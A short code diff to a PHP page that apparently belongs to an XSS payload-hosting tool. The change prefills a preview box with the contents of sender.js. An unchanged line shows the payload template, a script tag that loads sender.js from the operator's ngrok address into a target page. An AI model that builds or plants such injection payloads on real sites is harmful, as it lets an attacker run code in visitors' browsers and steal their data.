@@ -47,7 +47,12 @@ if (!file_exists("sender.js")) {
               <input type="text" class="form-control form-control-sm" value="Payload : <script src=<?php echo str_replace("https:","",trim($ngrokURL))."/sender.js"?>></script>" readonly>
             </div>
             <div class="form-group">
-              <textarea class="form-control form-control-sm" id="payload" rows="10" placeholder="Payload Preview" name="backPayload"></textarea>
+              <textarea class="form-control form-control-sm" id="payload" rows="10" placeholder="Payload Preview" name="backPayload">
+                <?php 
+                  $lastPayload = file_get_contents('sender.js');
+                  echo $lastPayload;
+                ?>
+                </textarea>
             </div>
             <div class="form-row">
               <div class="form-group col-md-12">
